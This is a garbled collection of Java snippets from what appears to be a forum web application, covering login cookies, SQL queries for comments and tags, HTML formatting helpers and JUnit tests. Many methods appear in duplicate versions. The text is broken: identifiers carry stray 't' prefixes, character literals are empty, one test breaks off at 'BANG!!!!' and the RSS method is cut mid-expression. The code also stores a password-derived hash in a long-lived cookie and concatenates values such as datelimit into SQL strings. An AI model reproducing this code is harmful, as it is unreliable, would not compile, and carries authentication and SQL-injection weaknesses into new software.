private void performLogin ( HttpServletResponse response , Connection db , Template tmpl , HttpSession session , String nick , User user ) throws SQLException { session . putValue ( " login " , Boolean . TRUE ) ; session . putValue ( " nick " , nick ) ; session . putValue ( " moderator " , user . canModerate ( ) ) ; createCookies ( response , tmpl , session , nick , user ) ; User . updateUserLastlogin ( db , nick , new Date ( ) ) ; } 
private void createCookies ( HttpServletResponse response , Template tmpl , HttpSession session , String nick , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( tmpl . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , nick ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public void checkBlocked ( ) throws AccessViolationException { if ( blocked ) { throw new AccessViolationException ( " Blocked user " ) ; } if ( ! activated ) { throw new AccessViolationException ( " Not activated user " ) ; } if ( anonymous ) { throw new AccessViolationException ( " Anonymous user - disabled " ) ; 
public void testURLHighlight5 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT9 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( formatter . process ( ) , RESULT9 ) ; } 
public static DateFormat createDefault ( ) { return DateFormat . getDateTimeInstance ( DateFormat . MEDIUM , DateFormat . MEDIUM , RUSSIAN_LOCALE ) ; } 
public static DateFormat createRFC822 ( ) { return new SimpleDateFormat ( " EEE, d MMM yyyy HH:mm:ss Z " , Locale . US ) ; } 
public static String showComments ( Connection db , User user , int offset , int limit ) throws SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { if ( limit < 1 | | offset < 0 ) { tpst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; } else { tpst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; } pst . setString ( 1 , user . getNick ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
public void updateMessageText ( Connection db ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public static String toString ( List < String > tags ) { if ( tags = = null | | tags . isEmpty ( ) ) { return " " ; } String str = " " ; for ( String tag : tags ) { str + = ( str . length ( ) > 0 ? " , " : " " ) + tag ; } return str ; } 
public static List < String > getMessageTags ( Connection con , int msgid ) throws SQLException { return new Tags ( con , msgid ) . tags ; } 
public static boolean updateTags ( Connection con , int msgid , List < String > tagList ) throws SQLException { List < String > oldTags = getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = true ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = true ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
public static String getTagLinks ( Connection con , int msgid ) throws SQLException { Tags tags = new Tags ( con , msgid ) ; return getTagLinks ( tags ) ; } 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } int msgid = new ServletParameterParser ( request ) . getInt ( " msgid " ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static String showReplies ( Connection db , User user , int offset , int limit ) tthrows SQLException { tDateFormat dateFormat = DateFormats . createDefault ( ) ; if ( offset < 0 ) offset = 0 ; if ( limit < 1 ) limit = 50 ; tStringBuilder out = new StringBuilder ( ) ; tPreparedStatement pst = null ; ttry { tpst = db . prepareStatement ( " SELECT sections.name AS ptitle, groups.title AS gtitle, " + " topics.title, topics.id AS topicid, comments.id AS msgid, " + " comments.postdate, users.nick AS author " + " FROM sections, groups, topics, comments, comments AS parents, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND parents.userid = ? " + " AND comments.userid = users.id " + " AND comments.replyto = parents.id " + " AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; tpst . setInt ( 1 , user . getId ( ) ) ; tResultSet rs = pst . executeQuery ( ) ; twhile ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " author " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } trs . close ( ) ; } finally { if ( pst ! = null ) { tpst . close ( ) ; } } treturn out . toString ( ) ; } 
public static String showReplies ( Connection db , User user , int offset , int limit ) tthrows SQLException { tDateFormat dateFormat = DateFormats . createDefault ( ) ; if ( offset < 0 ) { offset = 0 ; } if ( limit < 1 ) { limit = 50 ; } tStringBuilder out = new StringBuilder ( ) ; tPreparedStatement pst = null ; ttry { tpst = db . prepareStatement ( " SELECT sections.name AS ptitle, groups.title AS gtitle, " + " topics.title, topics.id AS topicid, comments.id AS msgid, " + " comments.postdate, users.nick AS author " + " FROM sections, groups, topics, comments, comments AS parents, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND parents.userid = ? " + " AND comments.userid = users.id " + " AND comments.replyto = parents.id " + " AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; tpst . setInt ( 1 , user . getId ( ) ) ; tResultSet rs = pst . executeQuery ( ) ; twhile ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " author " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } trs . close ( ) ; } finally { if ( pst ! = null ) { tpst . close ( ) ; } } treturn out . toString ( ) ; } 
public static String getTopicRss ( Connection db , String htmlPath , String fullUrl , Message topic ) throws SQLException , BadSectionException { StringBuilder buf = new StringBuilder ( ) ; int sectionid = topic . getSectionId ( ) ; boolean vote = topic . isVotePoll ( ) ; String subj = topic . getTitle ( ) ; String url = topic . getUrl ( ) ; String linktext = topic . getLinktext ( ) ; Section section = new Section ( db , sectionid ) ; '); buf.append(HTMLFormatter.htmlSpecialChars(poll.renderPoll(db, fullUrl))).append('' + " "); } catch (PollNotFoundException e) { TODO write to log } } } else { buf.append("<description>").append(HTMLFormatter.htmlSpecialChars(topic.getProcessedMessage(db))); } buf.append("</description>"); return buf.toString(); } 
public void testEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enablePreformatMode ( ) ; formatter . enableUrlHighLightMode ( ) ; try { BANG!!!! 
public void testURLHighlight ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT1 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT1 , formatter . process ( ) ) ; } 
public void testURLHighlight2 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT2 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT2 , formatter . process ( ) ) ; } 
public void testURLHighlight3 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT3 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( RESULT3 , formatter . process ( ) ) ; } 
public void testURLHighlight4 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT8 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( RESULT8 , formatter . process ( ) ) ; } 
public void testURLHighlight5 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT9 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT9 , formatter . process ( ) ) ; } 
public void testEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enablePreformatMode ( ) ; formatter . enableUrlHighLightMode ( ) ; try { String r = formatter . process ( ) ; 
public void testUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link " , s . endsWith ( " > " ) ) ; } 
public void testUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void testWithParamOnly ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_PARAM_ONLY ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void testWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_CYR ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { text = text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
static String texnl2br ( String text , boolean quoting ) { if ( ! quoting ) { text = text . replaceAll ( texnlRE . pattern ( ) , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuffer res = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public void testWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( RFC1738 ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void testNlSubstition ( ) { String s = HTMLFormatter . nl2br ( " This is a line nwith break inside it " ) ; Integer i = s . indexOf ( " <br> " ) ; Assert . assertThat ( " Newline is changed to <br> " , i , CoreMatchers . not ( - 1 ) ) ; } 
public void testStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; Assert . assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void testAmpEscape ( ) { String str = " a&b " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; Assert . assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void testParaSubstition ( ) { String str = " this is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . texnl2br ( str , false ) ; Integer i = s . indexOf ( " <p> " ) ; Assert . assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; Assert . assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { return text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
static String texnl2br ( String text , boolean quoting ) { if ( ! quoting ) { return text . replaceAll ( texnlRE . pattern ( ) , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public void testNoQuiting ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING1 ) ; formatter . enableTexNewLineMode ( ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , formatter . process ( ) ) ; } 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( text ) , delim , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
private static String URLEncoder ( String str ) { try { StringBuilder buf = new StringBuilder ( ) ; 
private static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { return text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
static String texnl2br ( String text , boolean quoting ) { if ( ! quoting ) { return text . replaceAll ( texnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
private static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuilder sb = new StringBuilder ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . toString ( ) ; } 
public static String wrapLongLines ( String text , int maxlength ) { StringTokenizer st = new StringTokenizer ( text , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( wrapLongLine ( st . nextToken ( ) , maxlength , " " ) ) ; } return sb . toString ( ) ; } 
static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { return text . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public void testCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; System . out . println ( s ) ; Assert . assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testGoogleCache ( ) { HTMLFormatter formatter = new HTMLFormatter ( GOOGLE_CACHE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( ')' ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( ')' ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( text ) , delim , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } if ( preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
public void enablePreformatMode ( ) { preformat = true ; nl = " " ; delim = " " ; } 
public void testUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void testWithParamOnly ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_PARAM_ONLY ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void testWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( RFC1738 ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void testNlSubstition ( ) { String s = HTMLFormatter . nl2br ( " This is a line nwith break inside it " ) ; Integer i = s . indexOf ( " <br> " ) ; assertThat ( " Newline is changed to <br> " , i , CoreMatchers . not ( - 1 ) ) ; } 
public void testStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void testAmpEscape ( ) { String str = " a&b " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void testParaSubstition ( ) { String str = " this is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . texnl2br ( str , false ) ; Integer i = s . indexOf ( " <p> " ) ; assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
public void testCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testGoogleCache ( ) { HTMLFormatter formatter = new HTMLFormatter ( GOOGLE_CACHE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testPreformatLong1 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST1 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT1 , s ) ; } 
public void testPreformatLong2 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST2 ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT2 , s ) ; } 
